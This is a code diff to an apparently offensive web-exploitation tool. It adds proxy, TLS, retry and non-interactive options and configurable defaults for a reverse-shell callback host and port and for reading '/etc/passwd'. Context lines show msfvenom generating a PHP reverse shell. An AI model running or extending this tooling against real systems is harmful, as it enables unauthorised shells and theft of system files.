@@ -28,6 +28,63 @@ USER_AGENTS = [
 # Rate limiting configuration
 RATE_LIMIT_DELAY = 0.1  # Default delay between requests in seconds
 REQUEST_TIMEOUT = (5, 15)  # connect timeout, read timeout
+HTTP_OPTIONS = {
+    "timeout": REQUEST_TIMEOUT,
+    "proxy": None,
+    "verify_tls": False,
+    "user_agent": None,
+    "retries": 0,
+}
+RUNTIME_OPTIONS = {
+    "assume_yes": False,
+    "lhost": "127.0.0.1",
+    "lport": "4444",
+    "read_file": "/etc/passwd",
+}
+
+
+def configure_http_options(args, config=None):
+    global RATE_LIMIT_DELAY
+    config = config or {}
+
+    timeout = getattr(args, "timeout", None) or config.get("request_timeout")
+    if timeout:
+        HTTP_OPTIONS["timeout"] = (float(timeout), float(timeout))
+
+    proxy = getattr(args, "proxy", None) or config.get("proxy")
+    HTTP_OPTIONS["proxy"] = proxy
+    HTTP_OPTIONS["verify_tls"] = bool(
+        getattr(args, "verify_tls", False) or config.get("verify_tls", False)
+    )
+    HTTP_OPTIONS["user_agent"] = getattr(args, "user_agent", None) or config.get(
+        "user_agent"
+    )
+    HTTP_OPTIONS["retries"] = int(
+        getattr(args, "retries", None) if getattr(args, "retries", None) is not None else config.get("retries", 0)
+    )
+
+    delay = getattr(args, "delay", None)
+    if delay is None:
+        delay = config.get("rate_limit_delay")
+    if delay is not None:
+        RATE_LIMIT_DELAY = float(delay)
+
+
+def configure_runtime_options(args):
+    RUNTIME_OPTIONS["assume_yes"] = bool(getattr(args, "yes", False))
+    if getattr(args, "lhost", None):
+        RUNTIME_OPTIONS["lhost"] = args.lhost
+    if getattr(args, "lport", None):
+        RUNTIME_OPTIONS["lport"] = str(args.lport)
+    if getattr(args, "read_file", None):
+        RUNTIME_OPTIONS["read_file"] = args.read_file
+
+
+def request_proxies():
+    proxy = HTTP_OPTIONS.get("proxy")
+    if not proxy:
+        return None
+    return {"http": proxy, "https": proxy}
 
 
 def is_interactive():
@@ -35,7 +92,7 @@ def is_interactive():
 
 
 def prompt_input(message, default=""):
-    if is_interactive():
+    if is_interactive() and not RUNTIME_OPTIONS.get("assume_yes", False):
         return input(message)
     return default
 
@@ -59,8 +116,8 @@ class listener:
 def msf_payload():
     """Use msfvenom to generate reverse shell payload"""
     filepath = "/tmp/shell.php"
-    lhost = prompt_input(colors("[?] Host For Callbacks: ", 94), "127.0.0.1")
-    lport = prompt_input(colors("[?] Port For Callbacks: ", 94), "4444")
+    lhost = prompt_input(colors("[?] Host For Callbacks: ", 94), RUNTIME_OPTIONS["lhost"])
+    lport = prompt_input(colors("[?] Port For Callbacks: ", 94), RUNTIME_OPTIONS["lport"])
 
     print(colors("[~] Generating PHP listener", 93))
 
@@ -183,17 +240,16 @@ def attack(
 
     # Add User-Agent if not specified
     if "User-Agent" not in request_headers:
-        if user_agent_rotation:
+        if HTTP_OPTIONS.get("user_agent"):
+            request_headers["User-Agent"] = HTTP_OPTIONS["user_agent"]
+        elif user_agent_rotation:
             request_headers["User-Agent"] = get_random_user_agent()
         else:
             request_headers["User-Agent"] = (
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             )
 
-    def send_request(request_url, request_location=location):
-        if rate_limit:
-            apply_rate_limit()
-
+    def send_request_once(request_url, request_location=location):
         if method == "POST":
             if data is not None:
                 body = data
@@ -209,17 +265,32 @@ def attack(
                 headers=request_headers,
                 cookies=cookies,
                 data=body,
-                verify=False,
-                timeout=REQUEST_TIMEOUT,
+                verify=HTTP_OPTIONS["verify_tls"],
+                timeout=HTTP_OPTIONS["timeout"],
+                proxies=request_proxies(),
             )
 
         return requests.get(
             request_url,
             headers=request_headers,
             cookies=cookies,
-            verify=False,
-            timeout=REQUEST_TIMEOUT,
+            verify=HTTP_OPTIONS["verify_tls"],
+            timeout=HTTP_OPTIONS["timeout"],
+            proxies=request_proxies(),
         )
+
+    def send_request(request_url, request_location=location):
+        if rate_limit:
+            apply_rate_limit()
+
+        attempts = HTTP_OPTIONS.get("retries", 0) + 1
+        last_error = None
+        for _ in range(attempts):
+            try:
+                return send_request_once(request_url, request_location)
+            except requests.RequestException as error:
+                last_error = error
+        raise last_error
 
     try:
         if relative:
